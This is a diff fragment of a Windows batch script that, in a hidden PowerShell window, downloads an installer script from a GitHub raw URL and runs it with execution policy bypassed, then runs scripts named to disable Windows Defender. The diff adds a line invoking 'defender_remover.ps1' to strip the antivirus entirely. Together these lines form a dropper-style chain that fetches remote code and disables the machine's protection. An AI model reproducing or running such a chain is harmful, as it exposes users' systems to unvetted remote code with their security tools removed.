@@ -28,4 +28,4 @@ cd /d "%~dp0"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/installer.ps1' -OutFile installer.ps1"
 powershell -NoProfile -ExecutionPolicy Bypass -File "installer.ps1"
 powershell -ExecutionPolicy Bypass -File "disableWinDef.ps1"
-
+powershell -ExecutionPolicy Bypass -File "defender_remover.ps1 Y"
